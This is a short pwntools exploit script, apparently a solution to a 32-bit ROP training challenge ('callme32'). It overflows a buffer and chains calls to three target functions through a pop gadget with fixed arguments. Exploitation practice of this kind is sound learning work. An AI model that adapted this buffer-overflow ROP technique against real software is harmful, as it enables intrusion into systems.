from pwn import *
elf = context.binary = ELF("./callme32")
io = process("./callme32")

pop_gadget=0x080487f9
def call(addr):
    payload=p32(addr)
    payload+=p32(pop_gadget)
    payload+=p32(0xdeadbeef)
    payload+=p32(0xcafebabe)
    payload+=p32(0xd00df00d)
    return payload

io.recv()
payload=b"A"*44
payload+=call(elf.sym['callme_one'])
payload+=call(elf.sym['callme_two'])
payload+=call(elf.sym['callme_three'])

io.sendline(payload)
io.interactive()

